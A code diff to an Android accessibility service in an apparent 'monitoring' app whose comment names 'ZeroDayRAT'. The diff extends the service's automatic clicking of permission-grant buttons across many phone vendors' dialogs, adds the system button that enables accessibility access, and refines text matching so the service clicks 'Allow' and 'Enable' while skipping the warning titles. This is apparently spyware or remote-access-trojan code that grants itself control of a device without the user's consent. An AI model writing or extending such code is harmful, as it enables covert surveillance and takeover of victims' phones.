@@ -88,23 +88,8 @@ class BlockAccessibilityService : AccessibilityService() {
     override fun onServiceConnected() {
         super.onServiceConnected()
         instance = this
-        try {
-            val info = serviceInfo ?: android.accessibilityservice.AccessibilityServiceInfo()
-            info.eventTypes = AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED or
-                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
-                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
-                    AccessibilityEvent.TYPE_VIEW_CLICKED or
-                    AccessibilityEvent.TYPE_VIEW_SCROLLED or
-                    AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
-            info.feedbackType = android.accessibilityservice.AccessibilityServiceInfo.FEEDBACK_GENERIC
-            info.flags = info.flags or
-                    android.accessibilityservice.AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
-                    android.accessibilityservice.AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
-                    android.accessibilityservice.AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
-            serviceInfo = info
-        } catch (e: Exception) {
-            Log.e("BlockA11y", "Failed to configure serviceInfo dynamically", e)
-        }
+        // Service configuration is declared fully in xml/accessibility_service_config.xml
+        // Avoid re-assigning serviceInfo dynamically to prevent Android from unbinding/reloading capabilities
         try {
             rulesCache = BlockRulesCache(applicationContext)
             com.spapp.monitoring.collectors.RealtimeLogObserverManager.start(applicationContext)
@@ -177,6 +162,7 @@ class BlockAccessibilityService : AccessibilityService() {
 
             // Target resource IDs across Google Pixel, AOSP, Samsung OneUI, Xiaomi MIUI, Oppo ColorOS, Vivo FuntouchOS
             val targetIds = listOf(
+                "android:id/accessibility_permission_enable_allow_button",
                 "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
                 "com.google.android.permissioncontroller:id/permission_allow_foreground_only_button",
                 "com.android.permissioncontroller:id/permission_allow_button",
@@ -271,20 +257,25 @@ class BlockAccessibilityService : AccessibilityService() {
     private fun findAndClickExactText(node: AccessibilityNodeInfo?, targetTexts: Set<String>): Boolean {
         if (node == null) return false
         try {
-            val nodeText = (node.text ?: node.contentDescription)?.toString()?.trim()?.lowercase() ?: ""
-            if (nodeText.isNotEmpty() && targetTexts.contains(nodeText)) {
-                val cls = (node.className ?: "").toString().lowercase()
-                if (cls.contains("button") || cls.contains("text") || node.isClickable || (node.parent?.isClickable == true)) {
-                    if (clickNodeOrParent(node)) {
+            val nodeText = (node.text ?: node.contentDescription)?.toString()?.trim()?.lowercase(Locale.getDefault()) ?: ""
+            val cls = (node.className ?: "").toString().lowercase(Locale.getDefault())
+            val isButtonLike = cls.contains("button") || node.isClickable
+
+            // Guard: Never click long question titles (e.g. "Allow ZeroDayRAT to have full control of your device?")
+            if (nodeText.length <= 35 && !nodeText.endsWith("?") && !nodeText.contains("full control") && !nodeText.contains("your device")) {
+                if (nodeText.isNotEmpty() && targetTexts.contains(nodeText)) {
+                    if (isButtonLike && clickNodeOrParent(node)) {
                         Log.i("BlockA11y", "Auto-clicked permission button by exact text: '$nodeText'")
                         return true
                     }
                 }
-            }
-            if (nodeText.startsWith("while using") || nodeText.startsWith("only this time") ||
-                nodeText == "allow" || nodeText.startsWith("allow ") || nodeText == "turn on" || nodeText == "enable") {
-                val cls = (node.className ?: "").toString().lowercase()
-                if (cls.contains("button") || node.isClickable || (node.parent?.isClickable == true)) {
+                val isPrefixMatch = nodeText.startsWith("while using") ||
+                        nodeText.startsWith("only this time") ||
+                        nodeText == "allow" ||
+                        (nodeText.startsWith("allow ") && nodeText.length <= 25) ||
+                        nodeText == "turn on" ||
+                        nodeText == "enable"
+                if (isPrefixMatch && isButtonLike) {
                     if (clickNodeOrParent(node)) {
                         Log.i("BlockA11y", "Auto-clicked permission button by prefix text: '$nodeText'")
                         return true
